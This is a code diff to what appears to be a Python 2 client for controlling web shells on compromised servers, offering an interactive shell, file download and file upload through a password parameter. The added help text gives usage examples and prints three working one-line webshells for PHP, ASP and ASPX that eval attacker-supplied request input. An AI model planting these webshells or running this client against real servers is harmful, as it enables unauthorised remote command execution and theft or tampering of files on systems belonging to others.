@@ -301,10 +301,10 @@ class PushConnector(FileConnector):
         payload = self.getPayload(self.server, self.password, self.remoteFilePath, fileContent)
         status, result = Connector.postToServer(self, payload)
         if result != '[S]NOFILE[E]':
-            print 'Uploading Successful'
+            print '+ Uploading Successful'
             print ''
         else:
-            print 'Uploading Failed'
+            print '+ Uploading Failed'
             print ''
 
     # The callable method to launch the connector
@@ -341,13 +341,27 @@ class Launcher(object):
     # return: none
     @classmethod
     def printHelp(self):
-        print '    -u             Specify the target URL'
-        print '    -s             Specify the type of server: php/asp/aspx/jsp'
-        print '    -p             Connection password (Command parameter name)'
+        print 'Help messages:'
+        print '  -u+        Specify the target URL'
+        print '  -s+        Specify the type of server: php/asp/aspx/jsp'
+        print '  -p+        Connection password (Command parameter name)'
         print ''
-        print '    --shell        Get a web based shell on the console'
-        print '    --pull+        Download file to local: --pull remote_path local_path / --pull remote_path'
-        print '    --push+        Upload a file from loacl: --push local_path remote_path'
+        print '  --shell    Get a web based shell on the console'
+        print '  --pull+    Download file to local: remote_path local_path / remote_path'
+        print '  --push+    Upload a file from loacl: --push local_path remote_path'
+        print ''
+        print 'Examples for using:'
+        print '  Get a shell:'
+        print '             -u http://localhost/shell.php -s php -p cmd --shell'
+        print '  Download a file:'
+        print '             -u http://localhost/shell.php -s php -p cmd --pull file1 file2'
+        print '  Upload a file:'
+        print '             -u http://localhost/shell.php -s php -p cmd --push file1 file2'
+        print ''
+        print 'Webshell samples:'
+        print '  PHP:       <?php @eval($_REQUEST[\'cmd\']);?>'
+        print '  ASP:       <%eval request("cmd")%>'
+        print '  ASPX:      <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
         print ''
 
     # Get the config Json object from args
